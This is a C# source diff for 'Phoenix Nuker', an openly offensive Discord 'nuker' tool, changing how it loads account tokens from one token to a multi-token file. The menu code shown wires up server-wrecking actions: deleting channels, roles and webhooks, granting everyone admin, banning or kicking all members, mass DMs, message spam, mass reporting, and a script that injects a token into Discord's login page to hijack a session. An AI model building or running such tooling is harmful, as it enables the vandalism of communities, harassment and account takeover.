@@ -17,6 +17,7 @@ namespace Phoenix
     class Program
     {
         #region Configuration
+        static string? token;
         static readonly List<string> tokenlist = new();
         static ulong? guildid;
         #endregion
@@ -42,35 +43,16 @@ namespace Phoenix
         static void Main()
         {
             Console.Title = "Phoenix Nuker";
-            Start();
-        }
-        #endregion
-
-        #region Start
-        static void Start()
-        {
             try
             {
                 Console.ForegroundColor = Color.Yellow;
-                if (!File.Exists("tokens.txt"))
-                    File.Create("tokens.txt").Dispose();
-
-                var list = File.ReadAllLines("tokens.txt");
-                int count = 0;
-                foreach (var token in list)
-                {
-                    count++;
-                    tokenlist.Add(token);
-                    try { Request.SendGet("/users/@me", token); } catch { Config.IsBot = true; }
-                }
-                if (count == 0)
-                {
-                    WriteLogo();
-                    Console.WriteLine("Paste your token(s) in tokens.txt file.");
-                    Thread.Sleep(5000);
-                    Environment.Exit(0);
-                }
-                Console.Title = $"Phoenix Nuker | Total Accounts: {count}";
+                if (!File.Exists("token.txt"))
+                    File.Create("token.txt").Dispose();
+                if (!File.Exists("multitokens.txt"))
+                    File.Create("multitokens.txt").Dispose();
+                var Token = File.ReadAllText("token.txt");
+                if (!string.IsNullOrEmpty(Token))
+                    token = Token;
                 Options();
             }
             catch (Exception e)
@@ -123,6 +105,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 1:
+                        Token();
                         WriteLogo();
                         string options2 = @"
 ╔══╦════════════╗
@@ -146,35 +129,41 @@ namespace Phoenix
                         Console.Write("Custom Status: ");
                         string status = Console.ReadLine();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.EditProfile(token, hypesquad, bio, status);
+                        User.EditProfile(token, hypesquad, bio, status);
                         Options();
                         break;
                     case 2:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.LeaveDeleteGuilds(token);
+                        User.LeaveDeleteGuilds(token);
                         Options();
                         break;
                     case 3:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.ClearRelationships(token);
+                        User.ClearRelationships(token);
                         Options();
                         break;
                     case 4:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.LeaveHypeSquad(token);
+                        User.LeaveHypeSquad(token);
                         Options();
                         break;
                     case 5:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.RemoveConnections(token);
+                        User.RemoveConnections(token);
                         Options();
                         break;
                     case 6:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.DeauthorizeApps(token);
+                        User.DeauthorizeApps(token);
                         Options();
                         break;
                     case 7:
+                        Token();
                         WriteLogo();
                         Console.Write("Guild name: ");
                         string name = Console.ReadLine();
@@ -186,60 +175,60 @@ namespace Phoenix
                         for (int i = 0; i < count; i++)
                         {
                             numb++;
-                            foreach (var token in tokenlist) User.CreateGuild(token, name);
+                            User.CreateGuild(token, name);
                             Console.ReplaceAllColorsWithDefaults();
                             Console.WriteLine($"Created: {numb}", Color.Lime);
                         }
                         Options();
                         break;
                     case 8:
+                        Token();
                         WriteLogo();
-                        Console.Write("Count: ");
-                        int count2 = int.Parse(Console.ReadLine());
-                        WriteLogo();
-                        int numb2 = 0;
-                        for (int i = 0; i < count2; i++)
+                        var task = Task.Run(() =>
                         {
-                            numb2++;
-                            foreach (var token in tokenlist)
+                            for (;;)
                             {
                                 User.ChangeTheme(token, "light");
                                 User.ChangeTheme(token, "dark");
                             }
-                            Console.ReplaceAllColorsWithDefaults();
-                            Console.WriteLine($"Changed: {numb2}", Color.Lime);
-                        }
+                        });
                         Options();
                         break;
                     case 9:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.ConfuseMode(token);
+                        User.ConfuseMode(token);
                         Options();
                         break;
                     case 10:
+                        Token();
                         WriteLogo();
                         Console.Write("Message: ");
                         string message = Console.ReadLine();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.MassDM(token, message);
+                        User.MassDM(token, message);
                         Options();
                         break;
                     case 11:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.UserInformation(token);
+                        User.UserInformation(token);
                         Options();
                         break;
                     case 12:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.BlockRelationships(token);
+                        User.BlockRelationships(token);
                         Options();
                         break;
                     case 13:
+                        Token();
                         WriteLogo();
-                        foreach (var token in tokenlist) User.DeleteDMs(token);
+                        User.DeleteDMs(token);
                         Options();
                         break;
                     case 14:
+                        Token();
                         WriteLogo();
                         SeleniumLogin();
                         Options();
@@ -247,31 +236,31 @@ namespace Phoenix
                     case 15:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteRoles(token, guildid);
+                        Guild.DeleteRoles(token, guildid);
                         Options();
                         break;
                     case 16:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.RemoveBans(token, guildid);
+                        Guild.RemoveBans(token, guildid);
                         Options();
                         break;
                     case 17:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteChannels(token, guildid);
+                        Guild.DeleteChannels(token, guildid);
                         Options();
                         break;
                     case 18:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteEmojis(token, guildid);
+                        Guild.DeleteEmojis(token, guildid);
                         Options();
                         break;
                     case 19:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteInvites(token, guildid);
+                        Guild.DeleteInvites(token, guildid);
                         Options();
                         break;
                     case 20:
@@ -287,7 +276,7 @@ namespace Phoenix
                         for (int i = 0; i < count3; i++)
                         {
                             numb3++;
-                            foreach (var token in tokenlist) Guild.CreateRole(token, guildid, name2);
+                            Guild.CreateRole(token, guildid, name2);
                             Console.ReplaceAllColorsWithDefaults();
                             Console.WriteLine("Created: " + numb3, Color.Lime);
                         }
@@ -306,7 +295,7 @@ namespace Phoenix
                         for (int i = 0; i < count4; i++)
                         {
                             numb4++;
-                            foreach (var token in tokenlist) Guild.CreateChannel(token, guildid, name3);
+                            Guild.CreateChannel(token, guildid, name3);
                             Console.ReplaceAllColorsWithDefaults();
                             Console.WriteLine("Created: " + numb4, Color.Lime);
                         }
@@ -315,13 +304,13 @@ namespace Phoenix
                     case 22:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.PruneMembers(token, guildid);
+                        Guild.PruneMembers(token, guildid);
                         Options();
                         break;
                     case 23:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.RemoveIntegrations(token, guildid);
+                        Guild.RemoveIntegrations(token, guildid);
                         Options();
                         break;
                     case 24:
@@ -333,19 +322,19 @@ namespace Phoenix
                         Console.Write("Message ID: ");
                         ulong? mid = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteAllReactions(token, cid, mid);
+                        Guild.DeleteAllReactions(token, cid, mid);
                         Options();
                         break;
                     case 25:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.GuildInformation(token, guildid);
+                        Guild.GuildInformation(token, guildid);
                         Options();
                         break;
                     case 26:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.LeaveDeleteGuild(token, guildid);
+                        Guild.LeaveDeleteGuild(token, guildid);
                         Options();
                         break;
                     case 27:
@@ -375,14 +364,14 @@ namespace Phoenix
                                 int count7 = int.Parse(Console.ReadLine());
                                 WriteLogo();
                                 for (int i = 0; i < count7; i++)
-                                    foreach (var token in tokenlist) Guild.MsgInEveryChannel(token, guildid, msg3);
+                                    Guild.MsgInEveryChannel(token, guildid, msg3);
                                 break;
                             case 2:
                                 WriteLogo();
                                 Console.Write("Message: ");
                                 string msg4 = Console.ReadLine();
                                 WriteLogo();
-                                foreach (var token in tokenlist) Guild.MsgInEveryChannel(token, guildid, msg4);
+                                Guild.MsgInEveryChannel(token, guildid, msg4);
                                 break;
                         }
                         Options();
@@ -395,56 +384,56 @@ namespace Phoenix
                         webhook = webhook.Replace("https://discord.com/api/webhooks/", "");
                         ulong? wid = ulong.Parse(webhook.Split('/')[0]);
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteWebhook(token, wid);
+                        Guild.DeleteWebhook(token, wid);
                         Console.WriteLine("Done");
                         Options();
                         break;
                     case 29:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteStickers(token, guildid);
+                        Guild.DeleteStickers(token, guildid);
                         Options();
                         break;
                     case 30:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.GrantEveryoneAdmin(token, guildid);
+                        Guild.GrantEveryoneAdmin(token, guildid);
                         Options();
                         break;
                     case 31:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteAutoModerationRules(token, guildid);
+                        Guild.DeleteAutoModerationRules(token, guildid);
                         Options();
                         break;
                     case 32:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.CreateInvite(token, guildid);
+                        Guild.CreateInvite(token, guildid);
                         Options();
                         break;
                     case 33:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteGuildScheduledEvents(token, guildid);
+                        Guild.DeleteGuildScheduledEvents(token, guildid);
                         Options();
                         break;
                     case 34:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteGuildTemplate(token, guildid);
+                        Guild.DeleteGuildTemplate(token, guildid);
                         Options();
                         break;
                     case 35:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteStageInstances(token, guildid);
+                        Guild.DeleteStageInstances(token, guildid);
                         Options();
                         break;
                     case 36:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Guild.DeleteWebhooks(token, guildid);
+                        Guild.DeleteWebhooks(token, guildid);
                         Options();
                         break;
                     case 37:
@@ -466,7 +455,7 @@ namespace Phoenix
                         for (int i = 0; i < mcount; i++)
                         {
                             total++;
-                            foreach (var token in tokenlist) Guild.SendWebhookMessage(token, wid2, wtoken, message2);
+                            Guild.SendWebhookMessage(token, wid2, wtoken, message2);
                             Console.WriteLine("Messages sent: " + total);
                         }
                         Options();
@@ -506,7 +495,7 @@ namespace Phoenix
                         int reports = 0;
                         for (int i = 0; i < count5; i++)
                         {
-                            foreach (var token in tokenlist) Guild.ReportMessage(token, gid, cid2, mid2, reason);
+                            Guild.ReportMessage(token, gid, cid2, mid2, reason);
                             reports++;
                             Console.WriteLine("Reports sent: " + reports);
                         }
@@ -515,13 +504,13 @@ namespace Phoenix
                     case 39:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Bot.BanAllMembers(token, guildid);
+                        Bot.BanAllMembers(token, guildid);
                         Options();
                         break;
                     case 40:
                         GuildID();
                         WriteLogo();
-                        foreach (var token in tokenlist) Bot.KickAllMembers(token, guildid);
+                        Bot.KickAllMembers(token, guildid);
                         Options();
                         break;
                     case 41:
@@ -530,7 +519,7 @@ namespace Phoenix
                         Console.Write("Nickname: ");
                         string nick = Console.ReadLine();
                         WriteLogo();
-                        foreach (var token in tokenlist) Bot.ChangeAllNicknames(token, guildid, nick);
+                        Bot.ChangeAllNicknames(token, guildid, nick);
                         Options();
                         break;
                     case 42:
@@ -538,6 +527,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 43:
+                        MultiTokens();
                         WriteLogo();
                         Console.WriteLine("If your tokens isn't phone verified, Discord may lock them.\n");
                         Console.Write("Invite code: ");
@@ -551,6 +541,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 44:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("Guild ID: ");
                         ulong? id = ulong.Parse(Console.ReadLine());
@@ -559,6 +550,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 45:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("Full Username: ");
                         string full = Console.ReadLine();
@@ -569,6 +561,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 46:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("Channel ID: ");
                         ulong? cid3 = ulong.Parse(Console.ReadLine());
@@ -584,6 +577,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 47:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("Channel ID: ");
                         ulong? cid4 = ulong.Parse(Console.ReadLine());
@@ -631,6 +625,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 48:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("User ID: ");
                         ulong? uid2 = ulong.Parse(Console.ReadLine());
@@ -639,6 +634,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 49:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("User ID: ");
                         ulong? uid = ulong.Parse(Console.ReadLine());
@@ -650,6 +646,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 50:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("Group ID: ");
                         ulong? gid2 = ulong.Parse(Console.ReadLine());
@@ -658,6 +655,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 51:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("Channel ID: ");
                         ulong? cid5 = ulong.Parse(Console.ReadLine());
@@ -666,6 +664,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 52:
+                        MultiTokens();
                         WriteLogo();
                         Console.Write("Guild ID: ");
                         ulong? gid3 = ulong.Parse(Console.ReadLine());
@@ -697,6 +696,7 @@ namespace Phoenix
                         Options();
                         break;
                     case 53:
+                        MultiTokens();
                         WriteLogo();
                         Console.ReplaceAllColorsWithDefaults();
                         foreach (var token in tokenlist)
@@ -737,6 +737,37 @@ namespace Phoenix
         }
         #endregion
 
+        #region Token
+        static void Token()
+        {
+            if (string.IsNullOrEmpty(token))
+            {
+                try
+                {
+                    Console.Clear();
+                    WriteLogo();
+                    Console.ForegroundColor = Color.Yellow;
+                    Console.WriteLine();
+                    Console.Write("Token: ");
+                    token = Console.ReadLine();
+                    token = token.Replace("'", "");
+                    token = token.Replace("\"", "");
+                    if (User.GetUsername(token) == "N/A")
+                    {
+                        WriteLogo();
+                        Console.WriteLine("Invalid token.");
+                        token = string.Empty;
+                        Thread.Sleep(3000);
+                        Options();
+                    }
+                    try { Request.SendGet("/users/@me", token); } catch { Config.IsBot = true; }
+                    Console.Clear();
+                }
+                catch { }
+            }
+        }
+        #endregion
+
         #region Guild ID
         static void GuildID()
         {
@@ -768,6 +799,33 @@ namespace Phoenix
         }
         #endregion
 
+        #region MultiTokens
+        static void MultiTokens()
+        {
+            try
+            {
+                Console.Clear();
+                WriteLogo();
+                var list = File.ReadAllLines("multitokens.txt");
+                int count = 0;
+                foreach (var token in list)
+                {
+                    count++;
+                    tokenlist.Add(token);
+                }
+                if (count == 0)
+                {
+                    WriteLogo();
+                    Console.WriteLine("Paste your tokens in multitokens.txt file.");
+                    Thread.Sleep(3000);
+                }
+                Console.Clear();
+                Options();
+            }
+            catch { }
+        }
+        #endregion
+
         #region Selenium Login
         static void SeleniumLogin()
         {
@@ -787,11 +845,8 @@ namespace Phoenix
 
                 IWebDriver driver = new ChromeDriver(service, options) { Url = "https://discord.com/login" };
 
-                foreach (var token in tokenlist)
-                {
-                    IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
-                    execute.ExecuteScript($"let token = \"{token}\"; function login(token) {{ setInterval(() => {{ document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${{token}}\"` }}, 50); setTimeout(() => {{ location.reload(); }}, 2500); }} login(token);");
-                }
+                IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
+                execute.ExecuteScript($"let token = \"{token}\"; function login(token) {{ setInterval(() => {{ document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${{token}}\"` }}, 50); setTimeout(() => {{ location.reload(); }}, 2500); }} login(token);");
             }
             catch (Exception e)
             {
